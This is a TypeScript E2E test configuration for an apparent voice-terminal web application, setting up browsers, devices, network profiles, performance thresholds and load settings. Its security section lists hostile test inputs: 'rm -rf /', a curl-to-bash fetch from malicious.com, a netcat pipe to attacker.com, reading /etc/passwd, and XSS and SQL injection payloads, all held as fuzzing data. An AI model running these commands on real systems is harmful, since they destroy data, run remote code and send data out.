/**
 * E2E Test Configuration
 * Centralized configuration for all E2E tests and environments
 */

export interface E2ETestConfig {
  // Environment settings
  environment: {
    baseUrl: string;
    wsProxyUrl: string;
    tmuxBackendUrl: string;
    redisUrl?: string;
    testDatabaseUrl?: string;
  };

  // Test execution settings
  execution: {
    timeout: number;
    retryAttempts: number;
    parallelWorkers: number;
    headless: boolean;
    slowMo: number;
    tracing: boolean;
    video: boolean;
    screenshots: boolean;
  };

  // Browser settings
  browsers: {
    chromium: BrowserConfig;
    firefox: BrowserConfig;
    webkit: BrowserConfig;
    edge?: BrowserConfig;
  };

  // Mobile device settings
  mobileDevices: {
    iPhone: DeviceConfig;
    android: DeviceConfig;
    tablet: DeviceConfig;
  };

  // Network simulation profiles
  networkProfiles: {
    [key: string]: NetworkProfile;
  };

  // Performance thresholds
  performance: {
    maxLatency: number;
    p95Latency: number;
    maxMemoryUsage: number;
    maxConnectionTime: number;
    minThroughput: number;
  };

  // Reliability thresholds
  reliability: {
    maxConnectionDrops: number;
    maxRecoveryTime: number;
    minUptime: number;
    maxDataLoss: number;
  };

  // Multi-user test settings
  multiUser: {
    maxConcurrentUsers: number;
    testDuration: number;
    rampUpTime: number;
    steadyStateTime: number;
    rampDownTime: number;
  };

  // Security test settings
  security: {
    enablePenetrationTests: boolean;
    enableFuzzTesting: boolean;
    maliciousInputSamples: string[];
    xssPayloads: string[];
    sqlInjectionPayloads: string[];
  };

  // Accessibility settings
  accessibility: {
    wcagLevel: 'A' | 'AA' | 'AAA';
    enableScreenReaderTests: boolean;
    enableKeyboardNavigationTests: boolean;
    enableColorContrastTests: boolean;
  };

  // Reporting settings
  reporting: {
    outputDir: string;
    formats: ('json' | 'html' | 'markdown' | 'junit')[];
    includeScreenshots: boolean;
    includeVideos: boolean;
    includeTraces: boolean;
    generateSummary: boolean;
  };
}

export interface BrowserConfig {
  enabled: boolean;
  headless: boolean;
  viewport: { width: number; height: number };
  userAgent?: string;
  permissions?: string[];
  args?: string[];
}

export interface DeviceConfig {
  enabled: boolean;
  viewport: { width: number; height: number };
  userAgent: string;
  isMobile: boolean;
  hasTouch: boolean;
  deviceScaleFactor: number;
}

export interface NetworkProfile {
  name: string;
  downloadThroughput: number; // bytes per second
  uploadThroughput: number;   // bytes per second
  latency: number;            // milliseconds
  packetLoss?: number;        // percentage (0-1)
  description: string;
}

// Environment-specific configurations
export const developmentConfig: E2ETestConfig = {
  environment: {
    baseUrl: 'http://localhost:4173',
    wsProxyUrl: 'ws://localhost:8080',
    tmuxBackendUrl: 'http://localhost:8081',
    redisUrl: 'redis://localhost:6379',
    testDatabaseUrl: 'redis://localhost:6380'
  },

  execution: {
    timeout: 30000,
    retryAttempts: 1,
    parallelWorkers: 2,
    headless: false,
    slowMo: 100,
    tracing: true,
    video: true,
    screenshots: true
  },

  browsers: {
    chromium: {
      enabled: true,
      headless: false,
      viewport: { width: 1280, height: 720 },
      permissions: ['microphone', 'clipboard-read', 'clipboard-write']
    },
    firefox: {
      enabled: true,
      headless: false,
      viewport: { width: 1280, height: 720 },
      permissions: ['microphone']
    },
    webkit: {
      enabled: true,
      headless: false,
      viewport: { width: 1280, height: 720 },
      permissions: ['microphone']
    }
  },

  mobileDevices: {
    iPhone: {
      enabled: true,
      viewport: { width: 390, height: 844 },
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
      isMobile: true,
      hasTouch: true,
      deviceScaleFactor: 3
    },
    android: {
      enabled: true,
      viewport: { width: 412, height: 915 },
      userAgent: 'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36',
      isMobile: true,
      hasTouch: true,
      deviceScaleFactor: 2.625
    },
    tablet: {
      enabled: false,
      viewport: { width: 820, height: 1180 },
      userAgent: 'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
      isMobile: true,
      hasTouch: true,
      deviceScaleFactor: 2
    }
  },

  networkProfiles: {
    'wifi': {
      name: 'WiFi',
      downloadThroughput: 30 * 1024 * 1024, // 30 Mbps
      uploadThroughput: 15 * 1024 * 1024,   // 15 Mbps
      latency: 28,
      description: 'Standard WiFi connection'
    },
    '4g': {
      name: '4G LTE',
      downloadThroughput: 9 * 1024 * 1024,  // 9 Mbps
      uploadThroughput: 2 * 1024 * 1024,    // 2 Mbps
      latency: 150,
      description: '4G mobile connection'
    },
    '3g': {
      name: '3G',
      downloadThroughput: 1.6 * 1024 * 1024, // 1.6 Mbps
      uploadThroughput: 750 * 1024,          // 750 Kbps
      latency: 300,
      description: '3G mobile connection'
    },
    'slow': {
      name: 'Slow 2G',
      downloadThroughput: 256 * 1024,  // 256 Kbps
      uploadThroughput: 128 * 1024,    // 128 Kbps
      latency: 2000,
      packetLoss: 0.1,
      description: 'Very slow connection with packet loss'
    }
  },

  performance: {
    maxLatency: 65,           // 65ms end-to-end latency requirement
    p95Latency: 100,          // 95th percentile latency
    maxMemoryUsage: 200 * 1024 * 1024, // 200MB per session
    maxConnectionTime: 5000,   // 5 seconds to establish connection
    minThroughput: 10          // 10 operations per second minimum
  },

  reliability: {
    maxConnectionDrops: 3,     // Max 3 drops per test session
    maxRecoveryTime: 5000,     // 5 seconds max recovery time
    minUptime: 99.5,          // 99.5% uptime requirement
    maxDataLoss: 0            // Zero data loss tolerance
  },

  multiUser: {
    maxConcurrentUsers: 25,    // Test up to 25 concurrent users
    testDuration: 300000,      // 5 minutes total test duration
    rampUpTime: 60000,         // 1 minute ramp up
    steadyStateTime: 180000,   // 3 minutes steady state
    rampDownTime: 60000        // 1 minute ramp down
  },

  security: {
    enablePenetrationTests: true,
    enableFuzzTesting: true,
    maliciousInputSamples: [
      'rm -rf /',
      '$(curl malicious.com/script.sh | bash)',
      '; cat /etc/passwd',
      '| nc attacker.com 4444',
      '`reboot`'
    ],
    xssPayloads: [
      '<script>alert("xss")</script>',
      'javascript:alert(1)',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>'
    ],
    sqlInjectionPayloads: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM users --"
    ]
  },

  accessibility: {
    wcagLevel: 'AA',
    enableScreenReaderTests: true,
    enableKeyboardNavigationTests: true,
    enableColorContrastTests: true
  },

  reporting: {
    outputDir: './test-results',
    formats: ['json', 'html', 'junit'],
    includeScreenshots: true,
    includeVideos: true,
    includeTraces: true,
    generateSummary: true
  }
};

export const stagingConfig: E2ETestConfig = {
  ...developmentConfig,
  environment: {
    baseUrl: 'https://staging.voice-terminal.example.com',
    wsProxyUrl: 'wss://staging-ws.voice-terminal.example.com',
    tmuxBackendUrl: 'https://staging-api.voice-terminal.example.com',
    redisUrl: 'redis://staging-redis.example.com:6379'
  },
  execution: {
    ...developmentConfig.execution,
    headless: true,
    parallelWorkers: 4,
    retryAttempts: 2
  },
  multiUser: {
    ...developmentConfig.multiUser,
    maxConcurrentUsers: 50
  }
};

export const productionConfig: E2ETestConfig = {
  ...stagingConfig,
  environment: {
    baseUrl: 'https://voice-terminal.example.com',
    wsProxyUrl: 'wss://ws.voice-terminal.example.com',
    tmuxBackendUrl: 'https://api.voice-terminal.example.com',
    redisUrl: 'redis://prod-redis.example.com:6379'
  },
  execution: {
    ...stagingConfig.execution,
    parallelWorkers: 8,
    retryAttempts: 3
  },
  multiUser: {
    ...stagingConfig.multiUser,
    maxConcurrentUsers: 100,
    testDuration: 600000 // 10 minutes for production
  },
  security: {
    ...stagingConfig.security,
    enablePenetrationTests: false, // Disabled in production
    enableFuzzTesting: false
  }
};

// CI/CD specific configuration
export const ciConfig: E2ETestConfig = {
  ...developmentConfig,
  execution: {
    ...developmentConfig.execution,
    headless: true,
    parallelWorkers: 1,
    timeout: 60000, // Longer timeout for CI
    tracing: false,
    video: false,
    screenshots: false
  },
  browsers: {
    chromium: {
      ...developmentConfig.browsers.chromium,
      headless: true,
      args: ['--no-sandbox', '--disable-dev-shm-usage']
    },
    firefox: {
      ...developmentConfig.browsers.firefox,
      enabled: false // Disable Firefox in CI for faster runs
    },
    webkit: {
      ...developmentConfig.browsers.webkit,
      enabled: false // Disable WebKit in CI for faster runs
    }
  },
  mobileDevices: {
    ...developmentConfig.mobileDevices,
    iPhone: {
      ...developmentConfig.mobileDevices.iPhone,
      enabled: false // Disable mobile tests in CI
    },
    android: {
      ...developmentConfig.mobileDevices.android,
      enabled: false
    }
  },
  multiUser: {
    ...developmentConfig.multiUser,
    maxConcurrentUsers: 10, // Reduced for CI resources
    testDuration: 120000    // 2 minutes for CI
  }
};

/**
 * Get configuration based on environment
 */
export function getConfig(): E2ETestConfig {
  const env = process.env.NODE_ENV || 'development';
  const isCI = process.env.CI === 'true';
  
  if (isCI) {
    return ciConfig;
  }
  
  switch (env) {
    case 'production':
      return productionConfig;
    case 'staging':
      return stagingConfig;
    case 'development':
    default:
      return developmentConfig;
  }
}

/**
 * Validate configuration
 */
export function validateConfig(config: E2ETestConfig): { valid: boolean; errors: string[] } {
  const errors: string[] = [];
  
  // Validate URLs
  try {
    new URL(config.environment.baseUrl);
  } catch {
    errors.push('Invalid base URL');
  }
  
  // Validate performance thresholds
  if (config.performance.maxLatency <= 0) {
    errors.push('Max latency must be positive');
  }
  
  if (config.performance.maxMemoryUsage <= 0) {
    errors.push('Max memory usage must be positive');
  }
  
  // Validate multi-user settings
  if (config.multiUser.maxConcurrentUsers <= 0) {
    errors.push('Max concurrent users must be positive');
  }
  
  if (config.multiUser.testDuration <= config.multiUser.rampUpTime + config.multiUser.rampDownTime) {
    errors.push('Test duration must be longer than ramp up + ramp down time');
  }
  
  // Validate network profiles
  for (const [name, profile] of Object.entries(config.networkProfiles)) {
    if (profile.downloadThroughput <= 0 || profile.uploadThroughput <= 0) {
      errors.push(`Invalid throughput values for network profile: ${name}`);
    }
    if (profile.latency < 0) {
      errors.push(`Invalid latency for network profile: ${name}`);
    }
  }
  
  return {
    valid: errors.length === 0,
    errors
  };
}

/**
 * Create test-specific configuration override
 */
export function createTestConfig(overrides: Partial<E2ETestConfig>): E2ETestConfig {
  const baseConfig = getConfig();
  
  return {
    ...baseConfig,
    ...overrides,
    environment: {
      ...baseConfig.environment,
      ...(overrides.environment || {})
    },
    execution: {
      ...baseConfig.execution,
      ...(overrides.execution || {})
    },
    performance: {
      ...baseConfig.performance,
      ...(overrides.performance || {})
    },
    reliability: {
      ...baseConfig.reliability,
      ...(overrides.reliability || {})
    }
  };
}

export default {
  getConfig,
  validateConfig,
  createTestConfig,
  developmentConfig,
  stagingConfig,
  productionConfig,
  ciConfig
};